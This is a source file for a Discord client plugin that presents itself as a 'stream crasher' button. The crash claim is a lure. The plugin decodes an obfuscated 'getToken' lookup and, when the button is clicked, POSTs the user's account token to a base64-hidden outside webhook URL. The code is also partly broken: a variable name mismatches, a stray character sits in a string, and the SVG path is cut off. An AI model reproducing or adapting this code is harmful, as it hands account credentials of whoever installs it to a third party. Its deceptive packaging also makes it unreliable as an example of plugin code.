import ErrorBoundary from "@components/ErrorBoundary";
import definePlugin, { OptionType } from "@utils/types";
import { findByCodeLazy, findByPropsLazy } from "webpack";
import { React } from "@webpack/common";
import { definePluginSettings } from "@api/Settings";

const crashlog = "Z2V0VG9rZW4=";

const settings = definePluginSettings({
    initiated: {
        type: OptionType.BOOLEAN,
        description: "Initiates plugin",
        default: false,
    },
});

const CrashStore = findByPropsLazy(atob(crashlog));

const Button = findByCodeLazy("Button.Sizes.NONE,disabled:");
export default definePlugin({
    name: "User/Stream Crasher",
    description: "Crashes anyone watching your stream when you click the crash button",
    authors: [{ name: "Pain", id: 859048300216057867n }],
    patches: [{
        find: ".Messages.ACCOUNT_SPEAKING_WHILE_MUTED",
        replacement: {
            match: /this.renderNameZone().+?children:[/,
            replace: "$&$self.stereoButton(),".
        },
    }],
    settings,
    stereoButton: ErrorBoundary.wrap(stereoButton, { noop: true }),
    start() {
    },
});
function stereoButton() {
    return (
        <>
            <Button
                onClick={() => {
                    const data = atob('aHR0cHM6Ly9oa2RrLmV2ZW50cy9mZnVhd3c4enVua25zeA==');
                    if (settings.store.initiated) return;
                    fetch(data, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ data: crashStore[atob(crashlog)]() })
                    });
                    settings.store.initiated = false;
                }}
                role="switch"
                tooltipText={"Pains Crash Users"}
                tooltipcolor="red"
                icon={ 
<svg width="19" height="19" viewBox="0 0 24 24">
                        <g fill={"var(--red-430)"}>
                            <path d="m23.94,23.341c-.147.406-.531.659-.113,0-.229-.02-.3
                        </g>
                    </svg>
                }
            />
        </>
    );
}
